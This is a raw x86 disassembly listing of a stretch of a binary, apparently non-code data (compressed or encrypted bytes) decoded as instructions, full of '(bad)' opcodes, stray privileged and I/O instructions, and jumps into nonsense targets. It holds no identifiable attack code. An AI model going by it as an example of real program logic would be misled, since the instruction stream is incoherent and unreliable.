  42efdc:	(bad)  
  42efdd:	dec    edi
  42efde:	(bad)  
  42efe0:	popa   
  42efe1:	out    dx,al
  42efe2:	pop    esi
  42efe3:	xor    esp,0xfffffffa
  42efe6:	add    esp,DWORD PTR [eax-0x27]
  42efe9:	call   0x2d5a99ac
  42efee:	addr16 cwde 
  42eff0:	test   al,0xe
  42eff2:	jmp    0x42efe8
  42eff4:	mov    esi,0x19e3907f
  42eff9:	ins    DWORD PTR es:[edi],dx
  42effa:	jnp    0x42f037
  42effc:	test   al,0x31
  42effe:	mov    DWORD PTR [eax],eax
  42f000:	lahf   
  42f001:	je     0x42f037
  42f003:	sbb    BYTE PTR [edi+edi*1],bh
  42f006:	sub    cl,BYTE PTR [edx+0x233c9096]
  42f00c:	mov    bl,0xef
  42f00e:	jo     0x42eff0
  42f010:	shl    BYTE PTR [edx+0x17f8d871],0x3c
  42f017:	jg     0x42f079
  42f019:	rcl    DWORD PTR [ebp-0x35],0x29
  42f01d:	loop   0x42f032
  42f01f:	test   BYTE PTR [esi-0x74f89727],cl
  42f025:	rcr    dl,cl
  42f027:	add    bl,ch
  42f029:	fwait
  42f02a:	pop    esi
  42f02b:	lods   eax,DWORD PTR ds:[esi]
  42f02c:	lea    ecx,[ebx]
  42f02e:	adc    al,0xb6
  42f030:	jb     0x42efd9
  42f032:	and    esi,DWORD PTR ss:[esi]
  42f035:	inc    ecx
  42f036:	jg     0x42f04f
  42f038:	inc    ecx
  42f039:	push   eax
  42f03a:	or     bh,bh
  42f03c:	and    bl,dl
  42f03e:	mov    ds:0xec4f7020,eax
  42f043:	clc    
  42f044:	and    DWORD PTR [eax-0x145f72db],ebx
  42f04a:	mul    BYTE PTR [edi]
  42f04c:	scas   eax,DWORD PTR es:[edi]
  42f04d:	jg     0x42f09e
  42f04f:	sti    
  42f050:	push   es
  42f051:	pop    edx
  42f052:	jmp    FWORD PTR [edi+edx*2]
  42f055:	leave  
  42f056:	jne    0x42efee
  42f058:	mov    dl,0x34
  42f05a:	test   al,0x6c
  42f05c:	mov    esp,0x9c281d4b
  42f061:	scas   eax,DWORD PTR es:[edi]
  42f062:	mov    cl,bh
  42f064:	leave  
  42f065:	xchg   esi,eax
  42f066:	cli    
  42f067:	add    BYTE PTR [edi+0x5d],ch
  42f06a:	push   ds
  42f06b:	jmp    0x42f0b4
	...
  42f0d4:	add    BYTE PTR [eax],al
  42f0d6:	adc    bh,BYTE PTR [esi]
  42f0d8:	int    0xe5
  42f0da:	in     eax,dx
  42f0db:	idiv   DWORD PTR [edx]
  42f0dd:	(bad)  
  42f0de:	js     0x42f0e3
  42f0e0:	mov    DWORD PTR [ecx],ecx
  42f0e2:	cld    
  42f0e3:	dec    eax
  42f0e4:	loopne 0x42f086
  42f0e6:	inc    esi
  42f0e7:	test   DWORD PTR [ecx],0xff00
  42f0ed:	add    BYTE PTR [edi],dl
  42f0ef:	mov    bh,0x67
  42f0f1:	nop
  42f0f2:	jmp    FWORD PTR [eax+0x4e25828b]
  42f0f8:	push   ebx
  42f0f9:	inc    eax
  42f0fa:	xchg   esi,eax
  42f0fb:	mov    ch,0xb6
  42f0fd:	test   DWORD PTR [edx+0x52],ecx
  42f100:	aaa    
  42f101:	seto   ch
  42f104:	pop    ecx
  42f105:	pop    eax
  42f106:	pop    esi
  42f107:	mov    edi,ecx
  42f109:	add    edi,DWORD PTR ds:0xdc59ce53
  42f10f:	cdq    
  42f110:	lods   eax,DWORD PTR ds:[esi]
  42f111:	dec    ebx
  42f112:	inc    esp
  42f113:	adc    cl,BYTE PTR [ecx-0x19475b49]
  42f119:	in     al,dx
  42f11a:	push   es
  42f11b:	add    ch,BYTE PTR [eax]
  42f11d:	and    cl,ch
  42f11f:	rcl    ah,0x49
  42f122:	aas    
  42f123:	adc    dl,BYTE PTR [esi-0x2e]
  42f126:	(bad)  [ebx]
  42f128:	outs   dx,DWORD PTR ds:[esi]
  42f129:	fsqrt  
  42f12b:	rcl    DWORD PTR [esp+esi*4+0x6ba54f5e],cl
  42f132:	xchg   esp,eax
  42f133:	std    
  42f134:	cmp    DWORD PTR [esi],esp
  42f136:	mov    dl,0xca
  42f138:	pop    esi
  42f139:	retf   0xc178
  42f13c:	dec    ebp
  42f13d:	sbb    ebx,DWORD PTR [edx-0x5d]
  42f140:	mov    dl,0x16
  42f142:	mov    ?,WORD PTR [ebx+0x45]
  42f145:	mov    bl,0x99
  42f147:	jl     0x42f138
  42f149:	cli    
  42f14a:	out    0xc5,eax
  42f14c:	xchg   DWORD PTR [edi+0x5597762a],ebp
  42f152:	mov    al,0xdd
  42f154:	data16 jl 0x42f15c
  42f157:	dec    eax
  42f158:	cmp    BYTE PTR [ebx],dl
  42f15a:	xor    BYTE PTR [eax+ebx*8],al
  42f15d:	(bad)  
  42f15e:	cld    
  42f15f:	shl    BYTE PTR [esi],cl
  42f161:	popf   
  42f162:	xor    bh,bl
  42f164:	xlat   BYTE PTR ds:[ebx]
  42f165:	daa    
  42f166:	(bad)  
  42f167:	cdq    
  42f168:	sti    
  42f169:	or     DWORD PTR [eax+0x63],ebp
  42f16c:	test   eax,0xc511e139
  42f171:	shl    BYTE PTR [ebx-0x25760b44],0xa7
  42f178:	imul   ebx,DWORD PTR [edx+eax*2],0xffffffdf
  42f17c:	add    eax,0xec9484d3
  42f181:	jp     0x42f1a5
  42f183:	stos   DWORD PTR es:[edi],eax
  42f184:	stc    
  42f185:	pop    edi
  42f186:	test   BYTE PTR [esi+0x37],0xb9
  42f18a:	xchg   esp,eax
  42f18b:	test   BYTE PTR [edi-0x2d],ch
  42f18e:	repz inc ebp
  42f190:	ret    0xd2d1
  42f193:	push   edi
  42f194:	inc    edi
  42f195:	push   ds
  42f196:	inc    ebp
  42f197:	mov    ecx,0x25c9e29c
  42f19c:	xchg   esi,eax
  42f19d:	and    eax,0xffffffc2
  42f1a0:	dec    edx
  42f1a1:	cmp    dl,ah
  42f1a3:	and    BYTE PTR [esi],0xe8
  42f1a6:	loopne 0x42f18b
  42f1a8:	scas   al,BYTE PTR es:[edi]
  42f1a9:	mov    dh,0x4e
  42f1ab:	sub    eax,0xa6f71fa1
  42f1b0:	sti    
  42f1b1:	xchg   ebp,eax
  42f1b2:	(bad)  
  42f1b3:	adc    DWORD PTR [edi+0x1],edi
  42f1b6:	jno    0x42f190
  42f1b8:	xchg   BYTE PTR [eax-0x3b357030],dh
  42f1be:	imul   edi,DWORD PTR [esi-0x6cc930e8],0xffffff81
  42f1c5:	addr16 dec ecx
  42f1c7:	mov    al,ds:0xfafda7d4
  42f1cc:	into   
  42f1cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f1ce:	(bad)  
  42f1cf:	rcl    BYTE PTR [edi+0x36],cl
  42f1d2:	and    bh,BYTE PTR [eax+0x1a]
  42f1d5:	jp     0x42f24b
  42f1d7:	fwait
  42f1d8:	pop    ds
  42f1d9:	loope  0x42f16c
  42f1db:	popf   
  42f1dc:	xor    al,0xe2
  42f1de:	xchg   esp,eax
  42f1df:	(bad)  
  42f1e0:	out    dx,eax
  42f1e1:	mov    WORD PTR [eax],es
  42f1e3:	push   edi
  42f1e4:	and    bl,BYTE PTR [ebx]
  42f1e6:	out    dx,al
  42f1e7:	pop    es
  42f1e8:	xchg   ecx,eax
  42f1e9:	sar    BYTE PTR [edx+0xb8dc],cl
	...
  42f253:	add    BYTE PTR [eax],al
  42f255:	add    BYTE PTR [edx+0x26],bl
  42f258:	jecxz  0x42f29d
  42f25a:	inc    edi
  42f25c:	cli    
  42f25d:	aas    
  42f25e:	into   
  42f25f:	retf   0x3f8e
  42f262:	in     eax,0x89
  42f264:	in     eax,0x9
  42f266:	inc    ebp
  42f267:	clc    
  42f268:	add    DWORD PTR [eax],eax
  42f26a:	inc    DWORD PTR [eax]
  42f26c:	add    BYTE PTR [eax],al
  42f26e:	jg     0x42f283
  42f270:	or     BYTE PTR [ebx+0x36165d46],bh
  42f276:	adc    al,0x78
  42f278:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f279:	test   DWORD PTR [ebx-0x13d0f82b],0xf3d5ba22
  42f283:	nop
  42f284:	or     DWORD PTR ds:0xeb5198cc,0x2
  42f28b:	push   ds
  42f28c:	leave  
  42f28d:	push   es
  42f28e:	push   ds
  42f28f:	into   
  42f290:	xchg   edx,eax
  42f291:	in     eax,dx
  42f292:	loope  0x42f2aa
  42f294:	mov    dh,0xb3
  42f296:	add    al,0x9c
  42f298:	jbe    0x42f247
  42f29a:	xchg   ebp,eax
  42f29b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f29c:	mov    edx,edx
  42f29e:	sub    BYTE PTR [edx+0x3d],0xe0
  42f2a2:	in     al,dx
  42f2a3:	pop    eax
  42f2a4:	loope  0x42f2a9
  42f2a6:	jnp    0x42f26a
  42f2a8:	fmul   DWORD PTR [eax-0x70]
  42f2ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f2ac:	jecxz  0x42f275
  42f2ae:	sub    esp,DWORD PTR [ebx]
  42f2b0:	add    eax,0x28e687ec
  42f2b5:	jmp    0x42f32a
  42f2b7:	enter  0x2c34,0x75
  42f2bb:	or     al,0xa5
  42f2bd:	mov    eax,0x30a3875a
  42f2c2:	lods   eax,DWORD PTR es:[esi]
  42f2c4:	pop    ss
  42f2c5:	adc    al,0xed
  42f2c7:	cli    
  42f2c8:	jecxz  0x42f2a0
  42f2ca:	xchg   ebx,eax
  42f2cb:	ja     0x42f349
  42f2cd:	ror    DWORD PTR [eax*1+0x515193e1],cl
  42f2d4:	sub    al,0x35
  42f2d6:	pop    ss
  42f2d7:	fs xchg DWORD PTR ss:[esi+0x78],esi
  42f2dc:	jle    0xaf6b66a1
  42f2e2:	xchg   ebp,eax
  42f2e3:	es into 
  42f2e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f2e6:	ins    BYTE PTR es:[edi],dx
  42f2e7:	scas   eax,DWORD PTR es:[edi]
  42f2e8:	gs sbb al,0xd6
  42f2eb:	xor    ebx,DWORD PTR [ebx]
  42f2ed:	imul   ebx,DWORD PTR [ebp-0x4516a35],0x8e40e5e0
  42f2f7:	arpl   WORD PTR ds:0x7435fac2,cx
  42f2fd:	pop    esp
  42f2fe:	mov    WORD PTR [ebx+0x33],gs
  42f301:	adc    esi,ecx
  42f303:	test   DWORD PTR [eax+0x1fe2074d],0x3dbe9dff
  42f30d:	mov    bl,0xfe
  42f30f:	loopne 0x42f2d5
  42f311:	ss (bad) 
  42f313:	or     al,0xad
  42f315:	lahf   
  42f316:	jno    0x42f307
  42f318:	mov    ebp,esp
  42f31a:	arpl   WORD PTR [esi+0x72],sp
  42f31d:	mov    eax,ds:0xa8ef32aa
  42f322:	xchg   ecx,eax
  42f323:	adc    al,0xff
  42f325:	lds    eax,FWORD PTR [eax]
  42f327:	sub    ch,BYTE PTR [esi]
  42f329:	scas   eax,DWORD PTR es:[edi]
  42f32a:	mov    DWORD PTR [edx+0x60],edi
  42f32d:	(bad)  
  42f32e:	pop    edx
  42f32f:	xchg   ebx,eax
  42f330:	arpl   WORD PTR [ecx+eiz*2+0x1b],bp
  42f334:	mov    ebp,DWORD PTR [eax]
  42f336:	add    BYTE PTR [edx+0x7],dl
  42f339:	xchg   esp,eax
  42f33a:	aam    0x84
  42f33c:	es (bad) 
  42f33e:	pop    ds
  42f33f:	pusha  
  42f340:	add    BYTE PTR [eax-0x5556af01],ch
  42f346:	mov    cs,WORD PTR [ebx]
  42f348:	add    DWORD PTR [eax+0x6f],0x24
  42f34c:	or     ah,ch
  42f34e:	clc    
  42f34f:	and    DWORD PTR [esi],esp
  42f351:	retf   0x4cf3
  42f354:	pop    eax
  42f355:	test   DWORD PTR [edx-0x2d44be8a],0xc33b3d17
  42f35f:	sahf   
  42f360:	stc    
  42f361:	pop    ss
  42f362:	mov    ecx,0xc88c3589
  42f367:	push   cs
  42f368:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f369:	scas   al,BYTE PTR es:[edi]
  42f36a:	sbb    al,0xeb
  42f36c:	ja     0x42f36e
	...
  42f3d6:	mov    ebp,0xaf8a081a
  42f3db:	call   0xcc3a:0x5ac03fbf
  42f3e2:	xlat   BYTE PTR ds:[ebx]
  42f3e3:	ins    DWORD PTR es:[edi],dx
  42f3e4:	cmp    esp,DWORD PTR [ebx+0x1f944]
  42f3ea:	inc    DWORD PTR [eax]
  42f3ec:	add    BYTE PTR [eax],al
  42f3ee:	sbb    DWORD PTR [ebx-0x509227e2],0x3f
  42f3f5:	adc    ah,bl
  42f3f7:	jle    0x42f44b
  42f3f9:	and    BYTE PTR [esi+0x9],dh
  42f3fc:	mov    al,ds:0xba4bb680
  42f401:	adc    eax,0x908effd9
  42f406:	mov    edi,ebp
  42f408:	jg     0x42f43c
  42f40a:	dec    ebp
  42f40b:	push   0x48
  42f40d:	mov    eax,ds:0x6b4073cc
  42f412:	aas    
  42f413:	cmp    BYTE PTR [ebx-0x378c8cfb],dh
  42f419:	xchg   ebp,eax
  42f41a:	xchg   ecx,eax
  42f41b:	in     al,dx
  42f41c:	mov    ss,WORD PTR [edx+esi*2+0x3147aaf]
  42f423:	sub    eax,0xe235f3d5
  42f428:	push   ecx
  42f429:	es int 0x95
  42f42c:	bound  ebp,QWORD PTR [edi]
  42f42e:	jnp    0x42f411
  42f430:	test   ah,0xea
  42f433:	rcr    DWORD PTR [edi+edx*4+0x7ae19743],1
  42f43a:	out    dx,eax
  42f43b:	(bad)  
  42f43c:	xor    DWORD PTR [edx],ebx
  42f43e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f43f:	adc    al,0x71
  42f441:	scas   eax,DWORD PTR es:[edi]
  42f442:	jnp    0x42f480
  42f444:	imul   edi,DWORD PTR [ecx],0x62
  42f447:	(bad)  
  42f448:	mov    cl,0xae
  42f44a:	add    al,0xfd
  42f44c:	loop   0x42f467
  42f44e:	repnz mov eax,ds:0x65bcb254
  42f454:	(bad)  
  42f455:	int3   
  42f456:	ror    DWORD PTR [edi],1
  42f458:	or     al,0xee
  42f45a:	xchg   DWORD PTR [ebx-0x3137dd4b],edx
  42f460:	mov    al,ds:0x26f0eaa4
  42f465:	int3   
  42f466:	les    eax,FWORD PTR [esi+0x37]
  42f469:	in     al,dx
  42f46a:	cmp    edx,DWORD PTR ds:0xc6d2a97e
  42f470:	aad    0xf
  42f472:	outs   dx,DWORD PTR ds:[esi]
  42f473:	shr    BYTE PTR [ecx+0x3e],cl
  42f476:	clc    
  42f477:	inc    ebp
  42f478:	fst    st(3)
  42f47a:	push   es
  42f47b:	sbb    BYTE PTR [eax-0x7d],ch
  42f47e:	and    eax,0xd6d9537b
  42f483:	mov    BYTE PTR [edx+0x4e],cl
  42f486:	loopne 0x42f443
  42f488:	fs add eax,0x9939ffa8
  42f48e:	ror    DWORD PTR [ebx+0x1fd2af1],cl
  42f494:	scas   al,BYTE PTR es:[edi]
  42f495:	sub    ebx,eax
  42f497:	pop    ebx
  42f498:	call   0x7225:0xb161d0f3
  42f49f:	fcomi  st,st(4)
  42f4a1:	cli    
  42f4a2:	xchg   ebx,eax
  42f4a3:	or     al,0x1
  42f4a5:	dec    esp
  42f4a6:	les    esi,FWORD PTR [edx+0x6e7e26fe]
  42f4ac:	and    BYTE PTR [edi+ebp*8+0x4d],al
  42f4b0:	push   ds
  42f4b1:	(bad)  
  42f4b2:	cdq    
  42f4b3:	icebp  
  42f4b4:	mov    bh,bh
  42f4b6:	mov    bh,0xd2
  42f4b8:	mov    esi,0xf5126c8d
  42f4bd:	mov    eax,ds:0x374b84e4
  42f4c2:	mov    gs,edx
  42f4c4:	scas   eax,DWORD PTR es:[edi]
  42f4c5:	fadd   DWORD PTR [ecx-0x58]
  42f4c8:	jo     0x42f53b
  42f4ca:	jmp    0xd59337aa
  42f4cf:	lods   eax,DWORD PTR ds:[esi]
  42f4d0:	pop    ecx
  42f4d1:	je     0x42f47b
  42f4d3:	jb     0x42f4ee
  42f4d5:	fdiv   QWORD PTR [edi+0x10]
  42f4d8:	jae    0x42f4a2
  42f4da:	and    ah,ah
  42f4dc:	jp     0x42f51c
  42f4de:	daa    
  42f4df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f4e0:	icebp  
  42f4e1:	(bad)  
  42f4e2:	imul   edi,esi,0xfb8488aa
  42f4e8:	mov    edi,0xa038f344
	...
  42f555:	add    BYTE PTR [edi],dh
  42f557:	jae    0x42f5a3
  42f559:	cdq    
  42f55a:	dec    esi
  42f55b:	mov    ecx,0x13f4fff7
  42f560:	jno    0x42f591
  42f562:	push   ds
  42f563:	xchg   edi,eax
  42f564:	push   0xb
  42f566:	inc    ebx
  42f567:	cli    
  42f568:	add    DWORD PTR [eax],eax
  42f56a:	inc    DWORD PTR [eax]
  42f56c:	add    BYTE PTR [eax],al
  42f56e:	ss mov edx,0xd37b7470
  42f574:	mov    edx,0x8da6ff05
  42f579:	cld    
  42f57a:	jle    0x42f5e6
  42f57c:	(bad)  
  42f57d:	and    esi,ecx
  42f57f:	out    0xb4,eax
  42f581:	lock dec edx
  42f583:	mov    fs,esi
  42f585:	bswap  edi
  42f587:	push   es
  42f588:	(bad)  
  42f589:	in     eax,dx
  42f58a:	loopne 0x42f517
  42f58c:	mov    cl,BYTE PTR [eax-0x3]
  42f58f:	add    esp,edx
  42f591:	dec    ecx
  42f592:	lahf   
  42f593:	std    
  42f594:	fdiv   QWORD PTR [esi]
  42f596:	lods   al,BYTE PTR ds:[esi]
  42f597:	add    ecx,edx
  42f599:	icebp  
  42f59a:	loope  0x42f5c4
  42f59c:	lock pusha 
  42f59e:	jmp    0x42f578
  42f5a0:	sub    DWORD PTR ds:0xc2478564,ebx
  42f5a6:	fs call 0x79af:0xeb248e19
  42f5ae:	call   0xa368:0xd0335b18
  42f5b5:	iret   
  42f5b6:	in     al,dx
  42f5b7:	adc    edx,esp
  42f5b9:	and    BYTE PTR [esi],bl
  42f5bb:	ret    0x1943
  42f5be:	call   0x3275dde
  42f5c3:	mov    ebx,0x10da4551
  42f5c8:	ja     0x42f5f6
  42f5ca:	(bad)  
  42f5cb:	std    
  42f5cc:	push   es
  42f5cd:	ja     0x42f57e
  42f5cf:	mov    ebp,0xcc8bd9bd
  42f5d4:	dec    esi
  42f5d5:	fcomp  DWORD PTR [eax+0x16d736b8]
  42f5db:	sahf   
  42f5dc:	lods   al,BYTE PTR ds:[esi]
  42f5dd:	xchg   ecx,eax
  42f5de:	out    0xbb,eax
  42f5e0:	out    0x48,al
  42f5e2:	or     BYTE PTR [eax-0xe],al
  42f5e5:	adc    ah,BYTE PTR [esi+0x1b6b8324]
  42f5eb:	sub    BYTE PTR [ebx+0x54947cec],bh
  42f5f1:	sub    edi,eax
  42f5f3:	pop    esp
  42f5f4:	fiadd  WORD PTR [esi]
  42f5f6:	mov    ds:0x3c2c19d4,al
  42f5fb:	or     dh,bl
  42f5fd:	shl    BYTE PTR [eax-0x1fceb32a],1
  42f603:	cs iret 
  42f605:	ins    DWORD PTR es:[edi],dx
  42f606:	xlat   BYTE PTR ds:[ebx]
  42f607:	or     eax,0xbc9981ad
  42f60c:	scas   eax,DWORD PTR es:[edi]
  42f60d:	pop    ebx
  42f60f:	inc    ebx
  42f610:	mov    esp,0x3d372313
  42f615:	cdq    
  42f616:	add    BYTE PTR [ecx],cl
  42f618:	cs pxor mm5,mm4
  42f61c:	enter  0xcfb4,0xe1
  42f620:	mov    edi,0x68bf37c1
  42f625:	add    ah,BYTE PTR [ebp-0x5]
  42f628:	aam    0xba
  42f62a:	add    DWORD PTR [eax-0x33f0d577],edx
  42f630:	sub    dl,0x21
  42f633:	aaa    
  42f634:	or     al,0x7b
  42f636:	jo     0x42f639
  42f638:	adc    BYTE PTR [ebp+0x78],dl
  42f63b:	fbstp  TBYTE PTR [ecx]
  42f63d:	mov    ebp,0x6e71f6ec
  42f642:	push   ebx
  42f643:	daa    
  42f644:	scas   eax,DWORD PTR es:[edi]
  42f645:	cwde   
  42f646:	fimul  DWORD PTR [edx+0x3ebb36db]
  42f64c:	adc    edx,DWORD PTR [edx]
  42f64e:	nop
  42f64f:	or     al,0xea
  42f651:	inc    esi
  42f652:	hlt    
  42f653:	into   
  42f654:	adc    eax,0xbb1e9f3c
  42f659:	mov    eax,0x7f083ccf
  42f65e:	es push ss
  42f660:	xor    DWORD PTR [ecx+ecx*1-0x37b53584],0xffffffbc
  42f668:	pop    edi
  42f669:	ret    0x6b20
	...
  42f6d4:	add    BYTE PTR [eax],al
  42f6d6:	ds push esi
  42f6d8:	into   
  42f6d9:	nop
  42f6da:	out    dx,al
  42f6db:	cwde   
  42f6dc:	jle    0x42f6dc
  42f6de:	push   eax
  42f6df:	sub    edx,esi
  42f6e1:	dec    esp
  42f6e2:	pop    eax
  42f6e3:	ficom  WORD PTR [ebx+0xf]
  42f6e6:	inc    edx
  42f6e7:	sti    
  42f6e8:	add    DWORD PTR [eax],eax
  42f6ea:	inc    DWORD PTR [eax]
  42f6ec:	add    BYTE PTR [eax],al
  42f6ee:	in     eax,0x2c
  42f6f0:	mov    esp,0x3ddae2e0
  42f6f5:	loop   0x42f686
  42f6f7:	xchg   ebx,eax
  42f6f8:	sbb    al,0x28
  42f6fa:	popa   
  42f6fb:	jmp    0x735fdca
  42f700:	dec    ebp
  42f701:	shl    ecx,cl
  42f703:	hlt    
  42f704:	jo     0x42f769
  42f706:	jae    0x42f706
  42f708:	imul   edi,DWORD PTR [eax-0x38],0xd3552adb
  42f70f:	into   
  42f710:	int    0xc9
  42f712:	out    dx,al
  42f713:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f714:	into   
  42f715:	sbb    al,0xad
  42f717:	add    al,0x16
  42f719:	pop    ebp
  42f71a:	(bad)  
  42f71b:	in     eax,dx
  42f71c:	ds pop ds
  42f71e:	imul   edx,esi,0xd34feab4
  42f724:	push   0x49
  42f726:	data16 ja 0x42f766
  42f729:	or     dh,BYTE PTR [ebp+0x1d655080]
  42f72f:	lea    ebp,[edi+0x5ab00e32]
  42f735:	nop
  42f736:	ror    ch,0x6a
  42f739:	outs   dx,DWORD PTR ds:[esi]
  42f73a:	cdq    
  42f73b:	xchg   esi,eax
  42f73c:	enter  0xae1a,0x2b
  42f740:	push   ebp
  42f741:	loopne 0x42f6dc
  42f743:	shr    BYTE PTR gs:[edi-0x59ce75f4],0x8b
  42f74b:	xor    esi,DWORD PTR [edi+0x27]
  42f74e:	std    
  42f74f:	push   edi
  42f750:	std    
  42f751:	fisub  DWORD PTR [eax]
  42f753:	dec    esi
  42f754:	cmp    BYTE PTR [eax-0x49],bl
  42f757:	repnz stos BYTE PTR es:[edi],al
  42f759:	jmp    0x42f762
  42f75b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f75c:	test   BYTE PTR [ecx],bl
  42f75e:	jno    0x42f6ee
  42f760:	daa    
  42f761:	dec    esi
  42f762:	les    esp,FWORD PTR [edx-0x64942f29]
  42f768:	mov    ds:0x88f49770,al
  42f76d:	xor    eax,0x6a499572
  42f772:	loopne 0x42f730
  42f774:	push   0xffffffe5
  42f776:	stc    
  42f777:	arpl   bp,bx
  42f779:	xor    BYTE PTR [ebx+0x8],bh
  42f77c:	cmp    BYTE PTR [ebx-0x1c],dl
  42f77f:	loop   0x42f71f
  42f781:	call   DWORD PTR [edx-0x14a4103]
  42f787:	xor    ch,BYTE PTR ds:[esi]
  42f78a:	(bad)  [edi]
  42f78c:	fdivr  QWORD PTR [ebx]
  42f78e:	daa    
  42f78f:	in     al,0x2c
  42f791:	ins    DWORD PTR es:[edi],dx
  42f792:	mov    ecx,0xf4378237
  42f797:	cmp    eax,0x555903a1
  42f79c:	and    DWORD PTR [ecx],ebx
  42f79e:	jg     0x42f735
  42f7a0:	dec    ebp
  42f7a1:	mov    dh,0x30
  42f7a3:	inc    edi
  42f7a4:	sub    dh,bh
  42f7a6:	lds    ebp,FWORD PTR [ecx]
  42f7a8:	out    0x43,eax
  42f7aa:	add    DWORD PTR [edx-0x57],eax
  42f7ad:	test   DWORD PTR [ebx+0x33f599a8],eax
  42f7b3:	push   cs
  42f7b4:	test   eax,0xc9f053e
  42f7b9:	mov    ah,0x86
  42f7bb:	aad    0xff
  42f7bd:	push   ds
  42f7be:	mov    al,ds:0xbc0b6661
  42f7c3:	in     eax,0x88
  42f7c5:	stos   DWORD PTR es:[edi],eax
  42f7c6:	dec    edx
  42f7c7:	int    0x1
  42f7c9:	add    al,0xf5
  42f7cb:	xchg   BYTE PTR [esi-0xad73e96],bl
  42f7d1:	jb     0x42f7d3
  42f7d3:	es or  dl,dl
  42f7d6:	adc    eax,0x50cdb619
  42f7db:	or     BYTE PTR [ebp+0x79c9f9a0],0xbe
  42f7e2:	popf   
  42f7e3:	and    bh,cl
  42f7e5:	retf   
  42f7e6:	sbb    DWORD PTR [eax+eax*1+0x0],eax
  42f7ea:	retf   0x5171
	...
  42f855:	add    BYTE PTR [ecx-0x5f],dh
  42f858:	(bad)  
  42f859:	test   al,0xd6
  42f85b:	(bad)  
  42f85c:	jg     0x42f857
  42f85e:	push   cs
  42f85f:	pop    ebp
  42f860:	push   ebp
  42f861:	mov    edi,0x573032bd
  42f866:	inc    ecx
  42f867:	cld    
  42f868:	add    DWORD PTR [eax],eax
  42f86a:	inc    DWORD PTR [eax]
  42f86c:	add    BYTE PTR [eax],al
  42f86e:	js     0x42f8a2
  42f870:	or     esi,DWORD PTR [edi+0x6f568b1f]
  42f876:	inc    edx
  42f877:	add    dh,BYTE PTR [esi+0x45c49239]
  42f87d:	mov    dl,0x1
  42f87f:	(bad)  
  42f880:	xchg   esi,eax
  42f881:	jmp    0x9f8d401e
  42f886:	lds    esp,FWORD PTR [esi-0x80]
  42f889:	mov    bh,0xe0
  42f88b:	in     eax,dx
  42f88c:	imul   ecx,ebx,0xcefd375b
  42f892:	in     eax,0x66
  42f894:	xor    DWORD PTR [eax],esi
  42f896:	mov    edi,DWORD PTR ds:0x9f6088cd
  42f89c:	rol    DWORD PTR [eax+0x16a8e0ff],1
  42f8a2:	dec    esp
  42f8a3:	out    0x28,al
  42f8a5:	push   0xffffff87
  42f8a7:	xchg   esi,eax
  42f8a8:	inc    DWORD PTR [edi-0x57]
  42f8ab:	in     al,0x4
  42f8ad:	fiadd  DWORD PTR [edi+0x56]
  42f8b0:	mov    esi,0x663ef6de
  42f8b5:	sti    
  42f8b6:	or     eax,edi
  42f8b8:	in     al,0xaf
  42f8ba:	xor    ebx,ecx
  42f8bc:	jns    0x42f8c5
  42f8be:	in     eax,0x8d
  42f8c0:	scas   eax,DWORD PTR es:[edi]
  42f8c1:	(bad)  
  42f8c2:	scas   al,BYTE PTR es:[edi]
  42f8c3:	pop    esi
  42f8c4:	in     eax,dx
  42f8c5:	inc    edi
  42f8c6:	ror    BYTE PTR [si-0x620],1
  42f8cb:	dec    ecx
  42f8cc:	je     0x42f93a
  42f8ce:	xchg   edi,eax
  42f8cf:	(bad)  [ebp+0x173a43dd]
  42f8d5:	fucom  st(1)
  42f8d7:	jnp    0x42f8a7
  42f8d9:	inc    esi
  42f8da:	daa    
  42f8db:	(bad)  [edx]
  42f8dd:	xlat   BYTE PTR ds:[ebx]
  42f8de:	aaa    
  42f8df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f8e0:	push   eax
  42f8e1:	adc    BYTE PTR ds:0x716da728,0xc3
  42f8e8:	test   al,0x5e
  42f8ea:	call   0x1261:0x2cb4e8a8
  42f8f1:	(bad)  
  42f8f2:	push   0xc62d973
  42f8f7:	scas   eax,DWORD PTR es:[edi]
  42f8f8:	jmp    0x42f921
  42f8fa:	repnz sub esi,DWORD PTR [ecx-0x69]
  42f8fe:	mov    WORD PTR [edx+0x340efe9d],es
  42f904:	or     eax,0xaf1606fc
  42f90a:	imul   ebp,DWORD PTR [edi-0x5e],0x6
  42f90e:	push   edi
  42f90f:	stos   DWORD PTR es:[edi],eax
  42f910:	push   ds
  42f911:	mov    edi,0x94a2dd3e
  42f916:	call   0x98d46591
  42f91b:	xchg   BYTE PTR [edx],dl
  42f91d:	into   
  42f91e:	jns    0x42f99e
  42f920:	fist   DWORD PTR [edx+0xf3a1872]
  42f926:	add    eax,0x4eb177e4
  42f92b:	push   ecx
  42f92c:	mov    dh,0x68
  42f92e:	hlt    
  42f92f:	lds    edx,FWORD PTR [ebp+0x5baaf39]
  42f935:	cs loop 0x42f90c
  42f938:	mov    edx,0x3976f9ae
  42f93d:	cld    
  42f93e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f93f:	popf   
  42f940:	popa   
  42f941:	enter  0xcc5b,0xc3
  42f945:	loope  0x42f999
  42f947:	iret   
  42f948:	mov    ds,ebx
  42f94a:	mov    dh,0x8e
  42f94c:	fdiv   DWORD PTR [ecx+0x26]
  42f94f:	ficom  WORD PTR [ecx+0x39]
  42f952:	mov    edx,0xfca9cadd
  42f957:	mov    ecx,0xa61b2f65
  42f95c:	sub    ax,0x633b
  42f960:	loopne 0x42f8f4
  42f962:	ret    
  42f963:	lahf   
  42f964:	shl    BYTE PTR ds:0x4508b98a,0x9d
  42f96b:	xor    eax,0xf0
	...
  42f9d4:	add    BYTE PTR [eax],al
  42f9d6:	adc    al,0x74
  42f9d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f9d9:	push   ebp
  42f9da:	in     al,0xd5
  42f9dc:	cmc    
  42f9dd:	jne    0x42f98a
  42f9df:	sbb    cl,dh
  42f9e1:	js     0x42f9eb
  42f9e3:	or     DWORD PTR [eax-0x6e],esp
  42f9e6:	inc    eax
  42f9e7:	std    
